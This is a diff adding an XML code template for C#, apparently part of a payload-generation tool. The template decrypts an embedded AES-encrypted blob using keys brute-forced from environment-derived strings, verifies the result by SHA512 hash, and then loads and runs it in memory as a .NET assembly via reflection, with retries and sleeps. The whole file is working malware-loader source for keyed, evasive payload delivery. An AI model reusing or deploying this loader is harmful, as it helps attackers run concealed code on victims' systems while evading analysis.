@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<language>
+  <name>csharp</name>
+  <extension>cs</extension>
+  <baseCode>
+using System;
+using System.Collections.Generic;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Keyring
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string fun = "{{.EncryptedBase64}}";
+            string chk = "{{.PayloadHash}}";
+			byte[] encryptedBlob = Convert.FromBase64String(fun);
+			byte[] aesIV = Convert.FromBase64String("{{.AESIVBase64}}");
+			int idx = 0;
+            Encoding utf8 = Encoding.UTF8;
+			do
+            {
+				List&lt;string> combos = new List&lt;string>();
+				List&lt;string> chains = new List&lt;string>();
+				chains.Add("");
+
+                {{.Callers}}
+
+				combos = GetCombinations(combos);
+				combos.Add("");
+				foreach(string chain in chains)
+				{
+					if(TryKeyCombos(combos, chain, encryptedBlob, aesIV, chk, utf8))
+					{
+						return;
+					}
+				}
+                {{if .Sleep}}
+                System.Threading.Thread.Sleep({{.Sleep}} * 1000);
+                {{end}}
+                idx++;
+            } while(idx &lt; {{.Retries}});
+        }
+
+		private static bool TryKeyCombos(List&lt;string> combos, string chain, byte[] encryptedBlob, byte[] aesIV, string payloadHash, Encoding e)
+		{
+			foreach(string combo in combos)
+			{
+				try
+				{
+                    byte[] key = e.GetBytes((combo + chain).ToLower());
+                    string keyHash = SHA512(key, 0);
+                    byte[] decr = AESDecrypt(e.GetBytes(keyHash), encryptedBlob, aesIV);
+                    string decr_hash = SHA512(decr, {{.MinusBytes}});
+					if(payloadHash == decr_hash)
+					{
+						Assembly a = Assembly.Load(decr);
+						Type type = a.GetType("{{.AssemblyType}}");
+						MethodInfo methodInfo = type.GetMethod("{{.AssemblyMethod}}");
+						if (methodInfo == null) { continue; }
+						var o = Activator.CreateInstance(type);
+						object[] arguments = null;
+						methodInfo.Invoke(o, arguments);
+						return true;
+					}
+				}
+				catch { }
+			}
+			return false;
+		}
+
+        //https://stackoverflow.com/questions/7802822/all-possible-combinations-of-a-list-of-values
+        private static List&lt;string> GetCombinations(List&lt;string> list)
+        {
+            List&lt;string> result = new List&lt;string>();
+            double count = Math.Pow(2, list.Count);
+            for (int i = 1; i &lt;= count - 1; i++)
+            {
+                string s = "";
+                string str = Convert.ToString(i, 2).PadLeft(list.Count, '0');
+                for (int j = 0; j &lt; str.Length; j++)
+                {
+                    if (str[j] == '1')
+                    {
+                        s = s + list[j];
+                    }
+                }
+                result.Add(s);
+            }
+            return result;
+        }
+
+        private static bool ByteArrayCompare(byte[] a1, byte[] a2)
+        {
+            if (a1.Length != a2.Length)
+                return false;
+
+            for (int i = 0; i &lt; a1.Length; i++)
+                if (a1[i] != a2[i])
+                    return false;
+
+            return true;
+        }
+
+        private static string SHA512(byte[] bytes, int mb)
+        {
+            byte[] hashMe = new byte[bytes.Length - mb];
+            Array.Copy(bytes, hashMe, bytes.Length - mb);
+
+            string hash;
+            using (SHA512Managed hasher = new SHA512Managed())
+            {
+                byte[] hashBytes = hasher.ComputeHash(hashMe);
+                hash = ToHex(hashBytes);
+            }
+            return hash;
+        }
+
+		//https://stackoverflow.com/questions/46194754/how-to-hex-encode-a-sha-256-hash
+		private static string ToHex(byte[] bytes)
+		{
+			StringBuilder result = new StringBuilder(bytes.Length * 2);
+			for (int i = 0; i &lt; bytes.Length; i++)
+				result.Append(bytes[i].ToString("x2"));
+			return result.ToString();
+		}
+
+        private static byte[] AESDecrypt(byte[] sha512, byte[] bytes, byte[] iv)
+        {
+            byte[] key = new byte[32];
+            Array.Copy(sha512, 0, key, 0, 32);
+
+            var aes = new RijndaelManaged();
+            aes.Padding = PaddingMode.PKCS7;
+            aes.Key = key;
+            aes.IV = iv;
+            aes.Mode = CipherMode.CBC;
+            return aes.CreateDecryptor().TransformFinalBlock(bytes, 0, bytes.Length);
+        }
+        {{.Functions}}
+    }
+}
+  </baseCode>
+</language>
